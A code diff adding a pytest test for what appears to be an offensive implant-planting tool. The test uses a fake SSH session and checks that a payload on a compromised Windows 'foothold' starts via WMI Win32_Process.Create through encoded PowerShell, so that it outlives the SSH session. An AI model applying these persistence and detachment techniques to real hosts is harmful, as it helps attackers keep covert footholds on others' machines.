@@ -514,3 +514,26 @@ def test_task_persistence_launches_through_a_single_instance_stub(tmp_path):
                for c in ssh.calls if "-EncodedCommand" in (c["cmd"] or "")]
     assert any("-run.cmd" in d and "tasklist" in d for d in decoded), "stub written"
     assert any("-run.cmd" in u for u in info["undo"]), info["undo"]
+
+
+def test_the_immediate_start_is_detached_from_the_ssh_session(tmp_path):
+    """Children of an OpenSSH session are killed with it. `start /b` was the
+    plant's own proof: the process existed while the plant looked and was gone by
+    the next command, so the start goes through Win32_Process.Create."""
+    import base64
+    _manifest(tmp_path)
+    payload = tmp_path / "dc01.bin"
+    payload.write_bytes(b"MZ")
+    ssh = FakeSSH().on(
+        "tasklist", rc=0,
+        out="INFO: No tasks are running which match the specified criteria.")
+    ctx = make_ctx(tmp_path / "state", ssh=ssh)
+    ctx.world.add_foothold("192.168.1.20", "Administrator", "pw", "admin", windows=True)
+    Planter(ctx, comp_dir=tmp_path)._install_windows("192.168.1.20", "dc01-1",
+                                                     payload, "http")
+    bodies = [base64.b64decode(c["cmd"].split("-EncodedCommand ")[1].strip())
+              .decode("utf-16-le")
+              for c in ssh.calls if "-EncodedCommand" in (c["cmd"] or "")]
+    assert any("Win32_Process" in d and "Create" in d for d in bodies), \
+        "the one-shot start should spawn under the WMI service, not the ssh session"
+    assert not any('start "" /b' in (c["cmd"] or "") for c in ssh.calls)
